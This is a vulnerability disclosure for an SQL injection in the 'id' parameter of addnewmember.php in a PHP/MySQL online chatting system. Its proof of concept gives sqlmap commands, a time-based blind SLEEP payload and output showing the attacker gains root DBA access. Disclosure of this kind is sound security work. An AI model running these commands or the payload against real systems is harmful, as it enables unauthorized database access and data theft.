# Online Chatting System using PHP/MySQL - SQL injection vulnerability
+ Author: xuanluansec
# Vendor Homepage
+ https://www.sourcecodester.com/php/14224/online-chatting-system-using-phpmysql.html
# Software Link
+ https://www.sourcecodester.com/download-code?nid=14224&title=Online+Chatting+System+using+PHP%2FMySQL
# Overview
+ Online Chatting System using PHP/MySQL SQLi POC is susceptible to serious security vulnerabilities caused by insufficient protection of the "id" parameter in the 'user/addnewmember.php' file. This vulnerability may be used to inject malicious SQL queries, resulting in unauthorized access and extraction of sensitive information from the database.
# Vulnerability Details
+ Online Chatting System using PHP/MySQL V1.0
+ Vulnerable File: user/addnewmember.php
+ Parameter Names: id
+ Attack Type: Remote
# Description
+ The lack of proper input validation and sanitization on the 'id' parameters allows an attacker to craft SQL injection queries, gaining unauthorized access to the database.


# Proof of Concept (PoC) : 
+ `sqlmap -u 'http://www.onlinechatting.com:8089/user/addnewmember.php?id=1' -p 'id' --data="user=1"--method='POST'`

```
---
Parameter: id (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1' AND (SELECT 1371 FROM (SELECT(SLEEP(5)))cMTO) AND 'agsQ'='agsQ
---
```
+ `sqlmap -u 'http://www.onlinechatting.com:8089/user/addnewmember.php?id=1' -p 'id' --data="user=1"--method='POST' --is-dba --current-user`

```
---
Parameter: id (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1' AND (SELECT 1371 FROM (SELECT(SLEEP(5)))cMTO) AND 'agsQ'='agsQ
---
[22:11:28] [INFO] the back-end DBMS is MySQL
web application technology: PHP 7.0.12, Nginx 1.11.5
back-end DBMS: MySQL >= 5.0.12
[22:11:28] [INFO] fetching current user
[22:11:28] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n]
[22:16:44] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions
[22:16:44] [CRITICAL] unable to connect to the target URL ('Invalid argument'). sqlmap is going to retry the request(s)
[22:16:56] [INFO] adjusting time delay to 2 seconds due to good response times
root@localhost
current user: 'root@localhost'
[22:20:13] [INFO] testing if current user is DBA
[22:20:13] [INFO] fetching current user
current user is DBA: True
```
![image](https://github.com/xuanluansec/vul/blob/main/vul/img/13.png)
